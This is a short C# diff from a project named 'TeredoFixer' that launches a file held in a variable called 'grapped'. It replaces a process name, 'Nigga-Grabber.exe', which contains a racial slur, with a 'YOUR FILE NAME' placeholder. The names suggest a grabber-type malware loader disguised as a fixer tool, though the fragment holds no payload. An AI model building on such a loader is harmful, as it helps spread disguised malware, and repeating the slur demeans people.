@@ -51,7 +51,7 @@ namespace TeredoFixer
                 Process.Start(grapped);
             }
             // checks if the program is running
-            if (Process.GetProcessesByName("Nigga-Grabber.exe").Length > 0)
+            if (Process.GetProcessesByName("YOUR FILE NAME.exe").Length > 0)
             {
                
             }
